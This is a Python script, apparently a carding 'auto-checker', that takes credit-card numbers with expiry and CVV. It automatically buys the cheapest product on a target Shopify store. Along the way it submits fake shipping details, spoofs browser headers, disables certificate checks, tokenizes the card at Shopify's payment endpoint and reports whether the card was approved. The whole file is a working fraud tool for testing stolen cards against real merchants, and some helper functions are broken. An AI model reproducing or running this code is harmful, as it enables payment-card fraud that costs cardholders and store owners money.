import requests
import warnings
import random
from retry_requests import retry
from urllib.parse import urlparse, quote
from time import time, sleep
import string
import json

class AutoShopify:

    

    my_session = retry()
    warnings.filterwarnings("ignore", message="Unverified HTTPS request")


    link = ''
    ccs = ''

    def __init__(self, link, ccs):
        self.link = link
        self.ccs = ccs

    def find_between(data: str, first: str, last: str) -> str:
        # Busca una subcadena dentro de una cadena, dados dos marcadores
        if not isinstance(data, str):
            raise TypeError("El primer argumento debe ser una cadena de texto.")

    def get_random_string(length):
        # Genera una cadena de texto aleatoria.
        letters = string.ascii_letters + string.digits
        result_str = ''.join(random.choice(letters) for i in range(length))
        return result_str


    def separar(self, ccs):
        ccs = self.ccs
        digitos, mes, year, cvv = ccs.split("|")
        cardf = " ".join([digitos[i:i+4] for i in range(0, len(digitos), 4)])
        mesito = mes.lstrip("0") if mes.startswith("0") else mes
        yearf = f"20{year}" if len(year) == 2 else year
        proxies = None

        return cardf, mesito, yearf, cvv

    
    def idpro(self, link, my_session):

        mensaje = None
        gate = None
        id_min1 = None
        domain = None
        domain1 = None

        response = my_session.get(f"https://{urlparse(link).netloc}/products.json", verify=False)

        print("Status Code:", response.status_code)
        if response.status_code == 200:
            
            # Parsear el JSON
            response_data = json.loads(response.text)

            # Diccionario para almacenar los precios y IDs únicos de productos
            prices_ids = {}

            # Iterar a través de la lista de productos
            for product in response_data["products"]:
                for variant in product["variants"]:
                    price = float(variant["price"])
                    product_id = variant["id"]
                    
                    # Agregar el precio y el ID al diccionario si el ID no está en él
                    if product_id not in prices_ids:
                        prices_ids[product_id] = price

            # Encontrar el precio mínimo
            min_price = min(prices_ids.values())

            # Obtener el ID correspondiente al precio mínimo
            id_min = next(id for id, price in prices_ids.items() if price == min_price)
            id_min1 = str(id_min)
            
            parsed_url = urlparse(link)
            domain = parsed_url.netloc.replace("www.", "")
            domain1 = parsed_url.netloc
        else:
            mensaje = "Site no Shopify"
            gate = "None ⚠️"

        return id_min1, domain, domain1, mensaje, gate

    


    def autoshopify(self, link, my_session, id_min1, domain, domain1, cardf, mesito, yearf, cvv):
        print("URL: "+urlparse(link).netloc)
        payload = {
            "id": id_min1
        }

        r1 = my_session.post(f"https://{urlparse(link).netloc}/cart/add.js", data=payload, verify=False)



        r2 = my_session.get(f"https://{urlparse(link).netloc}/cart" , verify=False)

        data = {
            'updates[]': '1',
            'checkout': '',
        }

        r3 = my_session.post(f"https://{urlparse(link).netloc}/cart", data=data , verify=False)

        if "graphql" in r3.text:
            mensaje = "Graphql no Suportado"
            gate = "None ⚠️"
            return mensaje, gate


        pageurl = r3.text.split('id: ')[1].split(',')[0]
        checkouts = r3.text.split('checkouts/')[1].split('"')[0]
        authenticity_token = r3.text.split('name="authenticity_token" value="')[1].split('"')[0]

        if pageurl == "":
            mensaje = "No se pudo obtener el pageurl"
            gate = "None ⚠️"
            return mensaje, gate
        
        if checkouts == "":
            mensaje = "No se pudo obtener el chekout"
            gate = "None ⚠️"
            return mensaje, gate
        
        elif checkouts == "c":
            mensaje = "Graphql no Suportado"
            gate = "None ⚠️"
            return mensaje, gate
        
        elif checkouts == "cn":
            mensaje = "Graphql no Suportado"
            gate = "None ⚠️"
            return mensaje, gate

        print("Pageurl Capturado: "+pageurl)
        print("Checkout Capturado: "+checkouts)
        print("Token 1:"+authenticity_token)

        emailE = "shdfiusfn@gmail.com"
        firstN = 'Pepe'
        lastN = 'lopez'


        print("Email: "+emailE)

        prueba = f"https://{domain1}/checkouts/{checkouts}"
        print(prueba)

        headers = {
                    'authority': domain,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'es-419,es;q=0.8',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://'+domain,
                    'referer': 'https://'+domain+'/',
                    'sec-ch-ua': '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'sec-gpc': '1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        }

        data = [
            ('_method', 'patch'),
            ('authenticity_token', authenticity_token),
            ('previous_step', 'contact_information'),
            ('step', 'shipping_method'),
            ('checkout[email]', emailE),
            ('checkout[buyer_accepts_marketing]', '0'),
            ('checkout[buyer_accepts_marketing]', '1'),
            ('checkout[shipping_address][first_name]', 'Juan'),
            ('checkout[shipping_address][last_name]', 'Perez'),
            ('checkout[shipping_address][address1]', '769 New York Street'),
            ('checkout[shipping_address][city]', 'Lawrence'),
            ('checkout[shipping_address][country]', ''),
            ('checkout[shipping_address][province]', 'New York'),
            ('checkout[shipping_address][zip]', '10080'),
            ('checkout[shipping_address][phone]', '4259885369'),
            ('checkout[shipping_address][country]', 'United States'),
            ('checkout[shipping_address][first_name]', 'Juan'),
            ('checkout[shipping_address][last_name]', 'Perez'),
            ('checkout[shipping_address][address1]', '769 New York Street'),
            ('checkout[shipping_address][city]', 'Lawrence'),
            ('checkout[shipping_address][zip]', '10080'),
            ('checkout[shipping_address][phone]', '4259885369'),
            ('checkout[client_details][browser_width]', '869'),
            ('checkout[client_details][browser_height]', '750'),
            ('checkout[client_details][javascript_enabled]', '1'),
            ('checkout[client_details][color_depth]', '24'),
            ('checkout[client_details][java_enabled]', 'false'),
            ('checkout[client_details][browser_tz]', '300'),
        ]
        r4 = my_session.post(f"https://{domain1}/{pageurl}/checkouts/{checkouts}", data=data, headers=headers, verify=False)

        sleep(7)

        headers = {
            'authority': urlparse(link).netloc,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://'+domain+'/',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Brave";v="116"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        }

        params = {
            'previous_step': 'contact_information',
            'step': 'shipping_method',
        }

        r4 = my_session.get(
            f"https://{domain1}/{pageurl}/checkouts/{checkouts}",
            params=params,
            headers=headers,
        )

        if "Complete the reCAPTCHA to continue" in r4.text:
            mensaje = "ReCaptcha Encontrado"
            gate = "None ⚠️"
            return mensaje, gate
        
        if "Out of stock" in r4.text:
            mensaje = "Producto Agotado"
            gate = "None ⚠️"
            return mensaje, gate
            
        authenticity_token2 = r4.text.split('name="authenticity_token" value="')[1].split('"')[0]
        if "data-shipping-method=" in r4.text:
            shipping = r4.text.split('data-shipping-method="')[1].split('"')[0]
        else:
            mensaje = "No se pudo obtener el shipping"
            gate = "None ⚠️"
            return mensaje, gate

        print("Token 2:"+authenticity_token2)
        print("Shipping Capturado: "+shipping)


        headers = {
            'authority': urlparse(link).netloc,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://'+urlparse(link).netloc,
            'referer': 'https://'+urlparse(link).netloc+'/',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Brave";v="116"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        }

        data = {
            '_method': 'patch',
            'authenticity_token': authenticity_token2,
            'previous_step': 'shipping_method',
            'step': 'payment_method',
            'checkout[shipping_rate][id]': shipping,
            'checkout[client_details][browser_width]': '886',
            'checkout[client_details][browser_height]': '750',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '300',
        }

        r5 = my_session.post(
            f"https://{domain1}/{pageurl}/checkouts/{checkouts}",
            headers=headers,
            data=data,
        )


        authenticity_token3 = r5.text.split('name="authenticity_token" value="')[1].split('"')[0]
        print("Token 3:"+authenticity_token3)

        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'es-419,es;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://checkout.shopifycs.com',
            'Referer': 'https://checkout.shopifycs.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Brave";v="116"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'credit_card': {
                'number': cardf,
                'name': f"{firstN} {lastN}",
                'month': mesito,
                'year': yearf,
                'verification_value': cvv,
            },
            'payment_session_scope': urlparse(link).netloc,
        }

        r6 = my_session.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data)

        sid = r6.json()['id']
        print("Payment Session ID: "+sid)

        headers = {
            'authority': urlparse(link).netloc,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://'+urlparse(link).netloc,
            'referer': 'https://'+urlparse(link).netloc+'/',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Brave";v="116"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        }

        data = {
                    '_method': 'patch',
                    'authenticity_token': authenticity_token3,
                    'previous_step': 'payment_method',
                    'step': '',
                    's': sid,
                    'checkout[payment_gateway]': '1111111111',
                    'checkout[credit_card][vault]': 'false',
                    'checkout[different_billing_address]': 'false',
                    'checkout[total_price]': '1170',
                    'complete': '1',
                    'checkout[client_details][browser_width]': '823',
                    'checkout[client_details][browser_height]': '750',
                    'checkout[client_details][javascript_enabled]': '1',
                    'checkout[client_details][color_depth]': '24',
                    'checkout[client_details][java_enabled]': 'false',
                    'checkout[client_details][browser_tz]': '300',
        }

        r7 = my_session.post(
            f"https://{domain1}/{pageurl}/checkouts/{checkouts}",
            headers=headers,
            data=data,
        )

        sleep(6)

        headers = {
            'authority': urlparse(link).netloc,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.9',
            'referer': 'https://'+urlparse(link).netloc+'/',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Brave";v="116"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        }

        params = {
            'from_processing_page': '1',
        }

        r8 = my_session.get(
            f"https://{domain1}/{pageurl}/checkouts/{checkouts}/processing",
            params=params,
            headers=headers,
        )

        if "Payment gateway is invalid" in r8.text:
            gateway = r7.text.split('data-select-gateway="')[1].split('"')[0]
            print("Gateway Capturado: "+gateway)
            price = r7.text.split('data-checkout-payment-due-target="')[1].split('"')[0]
            print("Precio Capturado: "+price)
            authenticity_tokens = r7.text.split('name="authenticity_token" value="')
            token4 = authenticity_tokens[2].split('"')[0]
            print("Token 4: "+token4)

            headers = {
                'Accept': 'application/json',
                'Accept-Language': 'es-419,es;q=0.7',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://checkout.shopifycs.com',
                'Referer': 'https://checkout.shopifycs.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'Sec-GPC': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Brave";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            json_data = {
                'credit_card': {
                    'number': cardf,
                    'name': f"{firstN} {lastN}",
                    'month': mesito,
                    'year': yearf,
                    'verification_value': cvv,
                },
                'payment_session_scope': urlparse(link).netloc,
            }

            r6 = my_session.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data)

            sid2 = r6.json()['id']
            print("Payment Session ID2: "+sid2)

            headers = {
                'authority': urlparse(link).netloc,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://'+urlparse(link).netloc,
                'referer': 'https://'+urlparse(link).netloc+'/',
                'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Brave";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                        '_method': 'patch',
                        'authenticity_token': token4,
                        'previous_step': 'payment_method',
                        'step': '',
                        's': sid2,
                        'checkout[payment_gateway]': gateway,
                        'checkout[credit_card][vault]': 'false',
                        'checkout[different_billing_address]': 'false',
                        'checkout[total_price]': price,
                        'complete': '1',
                        'checkout[client_details][browser_width]': '823',
                        'checkout[client_details][browser_height]': '750',
                        'checkout[client_details][javascript_enabled]': '1',
                        'checkout[client_details][color_depth]': '24',
                        'checkout[client_details][java_enabled]': 'false',
                        'checkout[client_details][browser_tz]': '300',
            }

            r7 = my_session.post(
                f"https://{domain1}/{pageurl}/checkouts/{checkouts}",
                headers=headers,
                data=data,
            )

            sleep(6)
            

            headers = {
                'authority': urlparse(link).netloc,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.9',
                'referer': 'https://'+urlparse(link).netloc+'/',
                'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Brave";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'from_processing_page': '1',
            }

            r8 = my_session.get(
                f"https://{domain1}/{pageurl}/checkouts/{checkouts}/processing",
                params=params,
                headers=headers,
            )
            with open("final2.html", "w", encoding="utf-8") as archivo:
                archivo.write(r8.text)
            if not "Thank you for your purchase!" in r8.text:
                mensaje = r8.text.split('class="notice__content"><p class="notice__text">')[1].split('</p></div></div>')[0]
                gate = "Sucess ✅"
                return mensaje, gate
            else:
                mensaje = "Approved ✅"
                gate = "Sucess ✅"
                return mensaje, gate